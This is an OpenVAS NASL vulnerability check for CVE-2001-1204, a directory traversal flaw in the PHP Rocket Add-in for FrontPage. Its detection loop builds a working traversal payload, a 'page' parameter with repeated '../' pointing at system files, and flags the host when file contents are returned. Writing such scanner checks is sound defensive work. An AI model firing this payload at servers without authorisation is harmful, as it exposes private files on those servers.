###############################################################################
# OpenVAS Vulnerability Test
# $Id: phprocketaddin_traversal.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# PHP Rocket Add-in File Traversal
#
# Authors:
# Drew Hintz ( http://guh.nu ) and Valeska Pederson
# Based on scripts written by Renaud Deraison and  HD Moore
#
# Copyright:
# Copyright (C) 2001 H D Moore & Drew Hintz ( http://guh.nu )
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10831");
  script_version("$Revision: 7577 $");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(3751);
  script_cve_id("CVE-2001-1204");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("PHP Rocket Add-in File Traversal");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2001 H D Moore & Drew Hintz ( http://guh.nu )");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  tag_summary = "There is a vulnerability in the PHP Rocket Add-in for FrontPage 
  that allows a remote attacker to view the contents of any arbitrary 
  file to which the web user has access.";

  tag_insight = "This vulnerability exists because the PHP Rocket Add-in does not
  filter out ../ and is therefore susceptible to this directory traversal attack.";

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/3751");

  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"insight", value:tag_insight);

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

files = traversal_files();

foreach check( make_list( "/phprocketaddin/", "/index.php" ) ) {

  foreach file( keys( files ) ) {

    url = check + "?page=" +  crap( data:"../", length:3*15 ) + files[file];

    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
